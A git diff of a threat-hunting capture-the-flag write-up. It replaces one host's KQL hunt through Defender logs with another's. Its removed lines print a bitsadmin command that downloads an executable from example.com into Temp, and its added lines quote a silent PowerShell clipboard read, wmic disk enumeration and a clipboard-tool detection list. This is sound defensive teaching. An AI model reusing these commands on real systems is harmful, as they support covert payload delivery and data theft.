@@ -96,122 +96,95 @@ DeviceProcessEvents
 
 **Answer: -ExecutionPolicy**
 
-## 🟩 Flag 2 – Reconnaissance Script Hash
+## 🟩 Flag 2 – Defense Disabling
 
 **Objective:**
 
-Identify reconnaissance stage binary.
-
-**What to Hunt:**
-
-Local recon indicators
-
-**Thought:**
-
-Recon always comes early — it’s the intruder mapping their new terrain.
-
- 🕵️ **Identify the standard hashed value associated with the recon attempt**
+Identify indicators that suggest attempts to imply or simulate changing security posture.
 
 Query used:
 ```
 DeviceProcessEvents
-| where DeviceName == "michaelvm"
-| where ProcessCommandLine contains "whoami"
-| project Timestamp, FileName, ProcessCommandLine, SHA256, FolderPath, InitiatingProcessFileName
-| order by Timestamp asc
+| where TimeGenerated between (datetime(2025-10-09) .. datetime(2025-10-17))
+| where InitiatingProcessAccountName == "g4bri3lintern"
+| where DeviceName == "gab-intern-vm"
+| where ProcessCommandLine contains "artifact"
 ```
 
-🧠 **Thought process:** I figured, since the first thing you do once you get remote access is type whoami, so I searched for that command in the command line. I found a command 'whoami' of which SHA256 was the right answer, BUT upon inspecting the SHA256 for actual clues of recon, I used the KQL below to find a lot of clues for example commands like whoami, schtasks, and deleting evidence of onedrivesetup. The evidence of the attacker being present was overwhelming.
+🧠 **Thought process:** I used DeviceProcessEvents within the given date range and filtered on the g4bri3lintern account and gab-intern-vm to focus on the intern’s activity. From there, I searched for command lines containing the keyword "artifact", which led me to the process referencing DefenderTamperArtifact.lnk as the file related to this exploit.
 
-```
-DeviceProcessEvents
-| where DeviceName == "michaelvm"
-| where SHA256 == "badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0"
-| project Timestamp, ProcessCommandLine, FileName
-| order by Timestamp asc
-```
+<img width="975" height="298" alt="image" src="https://github.com/user-attachments/assets/d34db1ac-d624-45ba-a256-b7cefac70eca" />
 
-<img width="600" src="https://github.com/user-attachments/assets/b6231c78-0a03-4bd2-813b-ac7b9e82eb37"/>
 
-**Answer: SHA256 = badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0**
+**Answer: DefenderTamperArtifact.lnk**
 
 ---
 
-## 🟩 Flag 3 – Sensitive Document Access
+## 🟩 Flag 3 – Quick Data Probe
 
 **Objective:**
 
-Reveal the document accessed/staged by attacker.
+Spot brief attempts to access transient sensitive data.
 
 **What to Hunt:**
 
-Access to meetings related directories or confidential crypto data.
+Clipboard or lightweight data queries.
 
 **Thought:**
 
-The attacker’s interest in financials reveals their motive — follow the money trail.
-
-**Hint:**
-
-1. Board
-
- 🕵️ **Provide the targeted file**
+Clipboard access is a classic low-effort probe, so I filtered for commands referencing it. The result showed a silent clipboard read attempt.
 
 Query used:
 ```
-DeviceEvents
-| where DeviceName == "michaelvm"
-| where FolderPath contains "board"
-| where ActionType == "SensitiveFileRead"
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-10-09) .. datetime(2025-10-17))
+| where DeviceName == "gab-intern-vm"
+| where ProcessCommandLine has_any ("Get-Clipboard","Set-Clipboard","Get-Clipboard -","clip.exe","/c clip","-clip","clipboard")
 ```
+<img width="975" height="192" alt="image" src="https://github.com/user-attachments/assets/553e777a-eb50-4ede-90bb-05d933248466" />
 
-🧠 **Thought process:** I used the hint Board well in this case. I knew the SensitiveFileRead is a good way of finding out which file was accessed, if it was important. Then i tried to query the Board for file name and folder path as well as process command line, of which the last two were a good hit. 
-
-
-<img width="600" src="https://github.com/user-attachments/assets/ec955588-e3cd-493a-8655-1ecc08fae16e"/>
-
-**Answer: QuarterlyCryptoHoldings.docx**
+**Answer: "powershell.exe" -NoProfile -Sta -Command "try { Get-Clipboard | Out-Null } catch { }"**
 
 ---
 
-## 🟩 Flag 4 – Last Manual Access to File
+## 🟩 Flag 4 – Host Context Recon
 
 **Objective:**
 
-Track last read of sensitive document.
+Find activity gathering basic system or user context.
 
 **What to Hunt:**
 
-Last file open timestamp.
+Recon commands such as hostname, whoami, or environment checks.
 
 **Thought:**
 
-Late-stage access usually precedes exfiltration — timeline alignment matters.
+By filtering recon-style command fragments, I pinpointed the last executed context query. This timestamp aligned with ongoing situational awareness checks.
 
+Query used: 
+```
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-10-09) .. datetime(2025-10-17))
+| where DeviceName == "gab-intern-vm"
+| where InitiatingProcessAccountName != "system"
+| project TimeGenerated, ProcessCommandLine, InitiatingProcessCommandLine
+| order by TimeGenerated asc
+```
+<img width="975" height="377" alt="image" src="https://github.com/user-attachments/assets/392a2084-9207-4066-b704-8c496841f6f7" />
 
- 🕵️ **Identify the last instance of the file access**
-
-Query used: Same as flag 3
-
-
-🧠 **Thought process:** From the results seen in flag 3, I got the Timestamp of the last file access.
-
-
-<img width="600" src="https://github.com/user-attachments/assets/ec955588-e3cd-493a-8655-1ecc08fae16e"/>
-
-**Answer: 2025-06-16T06:12:28.2856483Z**
+**Answer: 2025-10-09T12:51:44.3425653Z**
 
 ---
 
-## 🟩 Flag 5 – LOLBin Usage: bitsadmin
+## 🟩 Flag 5 – Storage Surface Mapping
 
 **Objective:**
 
-Identify stealth download via native tools.
+Detect discovery of local or network storage locations that might hold interesting data.
 
 **What to Hunt:**
 
-bitsadmin.exe with file transfer URL.
+Look for enumeration of filesystem or share surfaces and lightweight checks of available storage.
 
 **Thought:**
 
@@ -220,43 +193,24 @@ Abusing trusted binaries helps attackers blend in — keep an eye on LOLBins.
 
  🕵️ **Provide the command value associated with the initial exploit**
 
-Query used:
+Query used: same as query #4
 
-```
-DeviceProcessEvents
-| where DeviceName == "michaelvm"
-| where Timestamp between (datetime(2025-06-15T00:00:00Z) .. datetime(2025-06-17T00:00:00Z))
-| where FileName contains "bitsadmin.exe"
-| order by Timestamp asc
-```
+<img width="975" height="377" alt="image" src="https://github.com/user-attachments/assets/517461d7-5ca3-433d-b609-309afb98ef5a" />
 
-🧠 **Thought process:** I simply followed the hint and I got a straight answer in the logs.
 
-<img width="250" src="https://github.com/user-attachments/assets/fd161361-da91-49b7-b3b6-10a559c48896"/>
-
-**Answer: "bitsadmin.exe" /transfer job1 https://example.com/crypto_toolkit.exe C:\Users\MICH34~1\AppData\Local\Temp\market_sync.exe**
+**Answer: "cmd.exe" /c wmic logicaldisk get name,freespace,size"**
 
 ---
 
-## 🟩 Flag 6 – Suspicious Payload Deployment
+## 🟩 Flag 6 – Connectivity & Name Resolution Check
 
 **Objective:**
 
-Identify dropped executable payloads that do not align with baseline software.
+Identify checks that validate network reachability and name resolution.
 
 **What to Hunt:**
 
-New files placed in Temp or uncommon locations, especially with misleading names.
-
-**Thought:**
-
-Payloads must land before they run. Watch Temp folders for staging signs.
-
-**Hint:**
-
-1. Book of financial accounts
-
- 🕵️ **Identify the suspicious program**
+Network or process events indicating DNS or interface queries and simple outward connectivity probes.
 
 Query used:
 
@@ -274,7 +228,7 @@ DeviceFileEvents
 
 <img width="400" src="https://github.com/user-attachments/assets/8f2dce56-934b-4bd4-95b2-32f67088554c"/>
 
-**Answer: ledger_viewer.exe**
+**Answer: RuntimeBroker.exe**
 
 ---
 
